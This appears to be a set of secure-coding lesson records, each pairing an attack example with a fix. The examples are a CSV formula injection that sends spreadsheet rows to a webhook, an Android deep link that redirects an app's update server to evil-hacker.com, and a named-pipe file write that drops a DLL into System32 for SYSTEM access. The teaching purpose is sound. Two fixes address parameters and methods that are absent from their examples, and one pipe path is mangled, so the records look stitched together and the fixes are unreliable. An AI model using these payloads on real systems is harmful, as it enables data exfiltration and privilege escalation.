lesson.example:
Example target: https://target.example/createCampaign
Vulnerable code (pseudo‑JavaScript):
function exportCsv(userId){
  const rows = db.getCampaigns(userId); // each row has a "name" field
  let csv = "Name,Start,End\n";
  rows.forEach(r=>{
    csv += `${r.name},${r.start},${r.end}\n`; // no escaping of r.name
  });
  return csv;
}
Attack: submit a campaign name of =WEBSERVICE("https://webhook.site/xyz?data="&CONCAT(A2:C2))
Why it works: The exportCsv function writes the name directly into the CSV. When an admin downloads the file and opens it in Excel, the leading "=" makes Excel treat the cell as a formula and the WEBSERVICE function sends an HTTP GET to the attacker’s webhook, leaking the row data.

lesson.fix:
Sanitize the CSV output by prefixing any field that begins with =,+,-,@ with a single quote (') or by removing those characters entirely before writing to the file. Example fix in pseudo‑code:
function safeCsvField(value){
  if (/^[=+\-@]/.test(value)){
    return "'"+value; // prepend apostrophe to force Excel to treat it as text
  }
  return value;
}
Apply safeCsvField to the campaign name (and any other user‑provided fields) before concatenating into the CSV string. This single sanitization step eliminates both the WEBSERVICE exfiltration and the DDE command‑execution vectors.

lesson.example:
Imagine a smart home app 'target.example' that uses a deep link to set the 'Update Server' address: 'smarthome://update?server=updates.target.example'. If the app exports the activity handling this link without validation, a malicious app can send: 'smarthome://update?server=evil-hacker.com'. When the smart home app checks for updates, it will connect to the hacker's server instead of the real one. 

Attack Intent:
Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse("smarthome://update?server=evil-hacker.com"));
startActivity(i);

Why it works: The app trusts the 'server' parameter from the deep link without checking if it belongs to 'target.example', allowing an attacker to intercept the app's requests or provide malicious update files.

lesson.fix:
To fix this, implement two layers of defense. First, use a 'state' token: when the app starts a login, generate a random, unguessable string and store it in memory. Only accept callbacks that include this exact token. Second, implement a strict allowlist for the 'fqdn' parameter, ensuring it matches a known-good domain exactly.

```java
// Example Fix
String receivedState = uri.getQueryParameter("state");
if (receivedState == null || !receivedState.equals(storedState)) {
    throw new SecurityException("Invalid state token");
}
String fqdn = uri.getQueryParameter("fqdn");
if (!"vpn.vendor.com".equals(fqdn)) {
    throw new SecurityException("Untrusted host");
}
```

lesson.example:
**Fictional target:** target.example runs a service called UpdateSvc.exe that creates a named pipe \.pipeUpdatePipe with FILE_ALL_ACCESS for Everyone and registers a .NET Remoting object called FileWriter.

**Vulnerable code snippet (C#):**
```csharp
public class FileWriter : MarshalByRefObject {
    public void Write(string path, byte[] data) {
        System.IO.File.WriteAllBytes(path, data); // no validation!
    }
}
```

**Attack request (C# client):**
```csharp
ChannelServices.RegisterChannel(new IpcClientChannel(), false);
string url = "ipc://UpdatePipe/FileWriter";
FileWriter fw = (FileWriter)RemotingServices.Connect(typeof(FileWriter), url);
fw.Write("C:\\Windows\\System32\\evil.dll", new byte[]{0x4D,0x5A,...}); // raw DLL bytes
```
**Why it works:** The pipe is world‑writable, the Remoting object accepts any caller, and the Write method does not check the destination path, so the attacker can write arbitrary files as the SYSTEM account.

**Result:** The attacker can place a malicious DLL in a location later loaded by a privileged process, achieving a SYSTEM shell.

lesson.fix:
Restrict the named‑pipe ACL to the service’s own account (e.g., LocalSystem) and remove Everyone write permissions. Add authentication (e.g., Windows authentication token check) to the .NET Remoting channel before exposing objects. In the ElevatedBitsFileTransferor.StartForegroundJobInBackground method, validate DestinationFilePath against a whitelist of allowed directories and reject paths outside that list. Example fix:
```csharp
if(!Path.GetFullPath(dest).StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData)))
    throw new UnauthorizedAccessException();
```
Also consider running the file‑transfer component under a low‑privilege account instead of SYSTEM to limit impact.

